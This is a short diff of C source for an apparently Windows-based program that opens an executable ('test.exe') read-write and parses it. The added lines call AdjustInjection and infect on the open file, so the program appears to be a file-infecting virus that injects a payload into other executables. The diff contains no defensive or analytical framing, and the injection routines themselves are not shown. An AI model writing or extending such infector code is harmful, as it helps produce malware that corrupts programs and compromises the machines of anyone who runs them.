@@ -40,7 +40,7 @@ static inline int ReadWholeFile(HANDLE file_handle, u8 ** pbuffer){
 }
 
 int main(){
-    char* filename = "a.exe";
+    char* filename = "test.exe";
     INFO("Debug: Open File %s\n", filename);
     if(!OpenfileRW(filename)){
         printf("\tFail to open\n"); // FIXME: this is a debug info
@@ -51,9 +51,11 @@ int main(){
     }
     INFO("Debug: Parse %s\n", filename);
     parse();
-#ifndef NDEBUG
     infoParse();
-#endif
+    INFO("Debug: Adjust Injection\n");
+    AdjustInjection(injection);
+    INFO("Debug: infect\n");
+    infect(injection, file_handle);
 
     HeapFree(GetProcessHeap(), 0, file);
     CloseHandle(file_handle);
